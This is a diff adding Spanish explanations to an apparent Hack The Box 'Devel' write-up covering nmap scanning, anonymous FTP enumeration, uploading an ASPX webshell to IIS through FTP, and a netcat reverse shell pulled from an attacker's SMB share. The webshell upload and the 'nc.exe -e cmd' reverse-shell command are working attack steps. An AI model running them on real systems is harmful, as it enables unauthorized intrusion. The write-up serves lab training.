@@ -23,7 +23,7 @@ layout:
 
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina `Devel`. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.5 -oG allPorts
@@ -51,7 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 128.77 seconds
            Raw packets sent: 131166 (5.771MB) | Rcvd: 148 (8.672KB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -64,7 +64,9 @@ Nmap done: 1 IP address (1 host up) scanned in 128.77 seconds
 [*] Ports copied to clipboard
 ```
 
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado del escaneo con los scripts de **Nmap**, verificamos que el acceso al `FTP` a través del usuario `anonymous` se encuentra habilitado y hemos podido realizar una enumeración de los archivos y directorios presentes.
 
+Por otro lado, también comprobamos que se encuentra un servidor de `IIS` expuesto por el puerto `80`.
 
 ```bash
 ❯ nmap -sCV -p21,80 10.10.10.5 -A -oN targeted -oX targetedXML
@@ -103,7 +105,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 55.51 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -112,13 +114,13 @@ Nmap done: 1 IP address (1 host up) scanned in 55.51 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/5189_vmware_a8MW7VZJBQ.png" alt=""><figcaption></figcaption></figure>
 
 ## Web Enumeration
 
-
+Comprobaremos las cabeceras de la página web para verificar si podemos obtener algún tipo de información interesante, solamente logramos obtener la versión del `IIS`. Por otro lado, comprobamos a través de la herramienta `whatweb` las tecnologías que se utilizan en la aplicación web.
 
 ```bash
 ❯ curl -I http://10.10.10.5
@@ -136,9 +138,11 @@ Date: Thu, 20 Feb 2025 16:51:23 GMT
 http://10.10.10.5 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.5], Microsoft-IIS[7.5][Under Construction], Title[IIS7], X-Powered-By[ASP.NET]
 ```
 
-
+Accederemos a [http://10.10.10.5 ](http://10.10.10.5)en donde podremos comprobar el acceso al `IIS`, pero no logramos obtener nada interesante
 
 <figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+
+Realizaremos una enumeración de páginas web y directorios para verificar la existencia de posibles directorios, etc. En el resultado obtenido, solamente nos llama la atención el directorio `aspnet_client`.
 
 ```bash
 ❯ feroxbuster -u http://10.10.10.5/ -t 200 -C 500,502,404
@@ -167,17 +171,13 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 200      GET       32l       53w      689c http://10.10.10.5/
 ```
 
-
-
-
+Al tratar de acceder a [http://10.10.10.5/aspnet\_client/](http://10.10.10.5/aspnet_client/), se nos indica un mensaje de error `403 Forbidden`.
 
 <figure><img src="../../.gitbook/assets/5191_vmware_XJb8o3o5qa.png" alt=""><figcaption></figcaption></figure>
 
-
-
 ## FTP Enumeration
 
-
+A través de la herramienta de `NetExec` realizaremos una comprobación del acceso a través del usuario `anonymous` al servicio de `FTP`.
 
 ```bash
 ❯ nxc ftp 10.10.10.5 -u 'anonymous' -p ''
@@ -185,7 +185,7 @@ FTP         10.10.10.5      21     10.10.10.5       [*] Banner: Microsoft FTP Se
 FTP         10.10.10.5      21     10.10.10.5       [+] anonymous: - Anonymous Login!
 ```
 
-
+Listaremos el contenido del servidor `FTP`, en el resultado obtenido comprobamos la existencia de una imagen, una página `HTM` y un directorio `aspnet_client`.
 
 ```bash
 ❯ nxc ftp 10.10.10.5 -u 'anonymous' -p '' --ls
@@ -197,7 +197,7 @@ FTP         10.10.10.5      21     10.10.10.5       03-17-17  04:37PM           
 FTP         10.10.10.5      21     10.10.10.5       03-17-17  04:37PM               184946 welcome.png
 ```
 
-
+Realizaremos una comprobación de los directorios que vayamos encontrando, pero en este caso, no logramos obtener resultado ninguno.
 
 <pre class="language-bash"><code class="lang-bash">❯ nxc ftp 10.10.10.5 -u 'anonymous' -p '' --ls aspnet_client
 FTP         10.10.10.5      21     10.10.10.5       [*] Banner: Microsoft FTP Service
@@ -217,7 +217,7 @@ FTP         10.10.10.5      21     10.10.10.5       [+] anonymous: - Anonymous L
 FTP         10.10.10.5      21     10.10.10.5       [*] Directory Listing for aspnet_client/system_web/2_0_50727
 </code></pre>
 
-
+Nos descargaremos el archivo `iistart.htm` que nos encontramos para comprobar si en el código fuente de la página existía algún tipo de información interesante.
 
 ```bash
 ❯ nxc ftp 10.10.10.5 -u 'anonymous' -p '' --get iisstart.htm
@@ -226,7 +226,7 @@ FTP         10.10.10.5      21     10.10.10.5       [+] anonymous: - Anonymous L
 FTP         10.10.10.5      21     10.10.10.5       [+] Downloaded: iisstart.htm
 ```
 
-
+El contenido del archivo `iistart.htm` se trata de la página web que se encuentra expuesta del servidor `IIS`en [http://10.10.10.5](http://10.10.10.5).
 
 {% code title="iistart.htm" %}
 ```html
@@ -269,6 +269,8 @@ a img {
 
 ### Abusing FTP & IIS to Upload a Webshell and Execute Commands
 
+Dado que hemos comprobado que al parecer el servidor `FTP` se encuentra montado en la ruta donde se encuentra el `IIS`levantado, lo que probaremos es de intentar subir una **webshell** de `ASPX` para poder  ejecutar comandos arbitrarios en el sistema objetivo.
+
 ```bash
 ❯ locate cmd.aspx
 /usr/share/davtest/backdoors/aspx_cmd.aspx
@@ -277,7 +279,7 @@ a img {
 ❯ cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx .
 ```
 
-
+Subiremos nuestra `webshell` llamada `cmd.aspx`al servidor `FTP`.
 
 ```bash
 ❯ nxc ftp 10.10.10.5 -u 'anonymous' -p '' --put cmd.aspx cmd.aspx
@@ -286,7 +288,7 @@ FTP         10.10.10.5      21     10.10.10.5       [+] anonymous: - Anonymous L
 FTP         10.10.10.5      21     10.10.10.5       [+] Uploaded: cmd.aspx to cmd.aspx
 ```
 
-
+Verificaremos que finalmente se ha subido correctamente, con lo cual confirmamos que tenemos capacidad de subir archivos desde nuestro sistema.
 
 ```bash
 ❯ nxc ftp 10.10.10.5 -u 'anonymous' -p '' --ls
@@ -299,18 +301,18 @@ FTP         10.10.10.5      21     10.10.10.5       03-17-17  04:37PM           
 FTP         10.10.10.5      21     10.10.10.5       03-17-17  04:37PM               184946 welcome.png
 ```
 
-
+Accederemos a [http://10.10.10.5/cmd.aspx](http://10.10.10.5/cmd.aspx) y comprobaremos que efectivamente se encuentra nuestra `webshell` subida y podemos ejecutar comandos en el sistema.
 
 <figure><img src="../../.gitbook/assets/5193_vmware_8KpYM3PEW4.png" alt=""><figcaption></figcaption></figure>
 
-
+Ahora que tenemos capacidad de lograr ejecutar comandos arbitrarios en el sistema, el siguiente paso será lograr obtener acceso al equipo. Por lo tanto, nos pondremos en escucha con `nc` para recibir la Reverse Shell.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+En nuestro equipo local, deberemos de disponer del binario de `nc.exe` en el cual compartiremos a través de un servidor `SMB`.
 
 ```bash
 ❯ ls -l nc.exe
@@ -326,7 +328,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Config file parsed
 ```
 
-
+Ejecutaremos el siguiente comando para ejecutar el `nc.exe` que estamos compartiendo a través de nuestro recurso compartido y le indicaremos que nos proporcione una consola `CMD` a nuestro equipo atacante.
 
 ```bash
 \\10.10.16.3\smbFolder\nc.exe -e cmd 10.10.16.3 443
@@ -334,7 +336,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 <figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que finalmente hemos logrado acceso al sistema y nos encontramos con el usuario `iis apppool\web`.
 
 ```bash
 ❯ rlwrap -cAr nc -nlvp 443
